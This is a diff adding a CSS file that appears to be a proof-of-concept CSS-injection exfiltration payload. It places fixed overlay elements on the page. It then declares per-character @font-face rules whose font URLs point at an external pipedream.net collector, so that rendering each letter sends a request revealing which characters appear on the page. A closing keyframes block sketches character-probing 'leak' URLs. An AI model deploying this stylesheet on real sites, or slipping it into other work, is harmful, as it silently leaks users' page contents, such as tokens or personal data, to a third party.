@@ -1,0 +1,355 @@
+*
+{
+    color:white!important;
+    font-weigth: bold!important;
+    background-color: /*#007c51/*#95bf47*/#a62e21;
+   /* visibility:hidden;    */
+}
+
+.poc
+{
+    text-align:center!important;
+    position: fixed!important;
+    top: 0!important;
+    left: 0!important;
+    z-index: 999!important;
+    width: 100%!important;
+    height: 23px!important;
+    visibility:visible!important;   
+}
+.p2
+{
+ text-align:center!important;
+    position: fixed!important;
+    top: 45%!important;
+    left: 30%!important;
+    z-index: 999!important;
+    width: 40%!important;
+    height: 23px!important;
+    visibility:visible!important;   
+}
+#p
+{
+    text-align:center!important;
+    position: fixed!important;
+    top: 25%!important;
+    left: 30%!important;
+    z-index: 999!important;
+    width: 40%!important;
+    height: 32px!important;
+    
+  visibility:visible!important;    
+  border:5px solid black!important;
+  color: red!important;
+  font-weight: bold!important;
+  font-family:poc!important;
+}
+
+
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?A); 
+ unicode-range:U+0041;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?B); 
+ unicode-range:U+0042;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?C); 
+ unicode-range:U+0043;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?D); 
+ unicode-range:U+0044;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?E); 
+ unicode-range:U+0045;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?F); 
+ unicode-range:U+0046;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?G); 
+ unicode-range:U+0047;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?H); 
+ unicode-range:U+0048;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?I); 
+ unicode-range:U+0049;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?J); 
+ unicode-range:U+004A;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?K); 
+ unicode-range:U+004B;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?L); 
+ unicode-range:U+004C;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?N); 
+ unicode-range:U+004D;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?M); 
+ unicode-range:U+004E;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?O); 
+ unicode-range:U+004F;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?P); 
+ unicode-range:U+0050;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?Q); 
+ unicode-range:U+0051;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?R); 
+ unicode-range:U+0052;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?S); 
+ unicode-range:U+0053;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?T); 
+ unicode-range:U+0054;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?U); 
+ unicode-range:U+0055;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?V); 
+ unicode-range:U+0056;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?W); 
+ unicode-range:U+0057;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?X); 
+ unicode-range:U+0058;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?Y); 
+ unicode-range:U+0059;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://eoeb9f5cwy9vhpa.m.pipedream.net/?Z); 
+ unicode-range:U+005A;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:a');
+	unicode-range:U+0061;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:b');
+	unicode-range:U+0062;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:c');
+	unicode-range:U+0063;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:d');
+	unicode-range:U+0064;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:e');
+	unicode-range:U+0065;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:f');
+	unicode-range:U+0066;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:g');
+	unicode-range:U+0067;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:h');
+	unicode-range:U+0068;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:i');
+	unicode-range:U+0069;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:j');
+	unicode-range:U+006A;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:k');
+	unicode-range:U+006B;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:l');
+	unicode-range:U+006C;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:m');
+	unicode-range:U+006D;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:n');
+	unicode-range:U+006E;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:o');
+	unicode-range:U+006F;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:p');
+	unicode-range:U+0070;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:q');
+	unicode-range:U+0071;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:r');
+	unicode-range:U+0072;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:s');
+	unicode-range:U+0073;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:t');
+	unicode-range:U+0074;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:u');
+	unicode-range:U+0075;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:v');
+	unicode-range:U+0076;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:w');
+	unicode-range:U+0077;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:x');
+	unicode-range:U+0078;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:y');
+	unicode-range:U+0079;
+}
+@font-face{
+	font-family:poc;
+	src:url('https://eoeb9f5cwy9vhpa.m.pipedream.net/?:z');
+	unicode-range:U+007A;
+}
+
+div.leak::first-line{
+    font-size: 30px; 
+    text-transform: uppercase; 
+}
+
+@keyframes trychar {
+    0% { font-family: rest; } 
+    5% { font-family: has_A, rest; --leak: url(?a); }
+    6% { font-family: rest; }
+    10% { font-family: has_B, rest; --leak: url(?b); }
+    11% { font-family: rest; }
+    15% { font-family: has_C, rest; --leak: url(?c); }
+    16% { font-family: rest }
+    20% { font-family: has_D, rest; --leak: url(?d); }
+    21% { font-family: rest; }
+    25% { font-family: has_E, rest; --leak: url(?e); }
+    26% { font-family: rest; }
+    30% { font-family: has_F, rest; --leak: url(?f); }
+    31% { font-family: rest; }
+    35% { font-family: has_G, rest; --leak: url(?g); }
+    36% { font-family: rest; }
+    40% { font-family: has_H, rest; --leak: url(?h); }
+    41% { font-family: rest }
+    45% { font-family: has_I, rest; --leak: url(?i); }
+    46% { font-family: rest; }
+    50% { font-family: has_J, rest; --leak: url(?j); }
+    51% { font-family: rest; }
+    55% { font-family: has_K, rest; --leak: url(?k); }
+    56% { font-family: rest; }
+    60% { font-family: has_L, rest; --leak: url(?l); }
+    61% { font-family: rest; }
+    65% { font-family: has_M, rest; --leak: url(?m); }
+    66% { font-family: rest; }
+    70% { font-family: has_N, rest; --leak: url(?n); }
+    71% { font-family: rest; }
+    75% { font-family: has_O, rest; --leak: url(?o); }
+    76% { font-family: rest; }
+    80% { font-family: has_P, rest; --leak: url(?p); }
+    81% { font-family: rest; }
+    85% { font-family: has_Q, rest; --leak: url(?q); }
+    86% { font-family: rest; }
+    90% { font-family: has_R, rest; --leak: url(?r); }
+    91% { font-family: rest; }
+    95% { font-family: has_S, rest; --leak: url(?s); }
+    96% { font-family: rest; }
+}
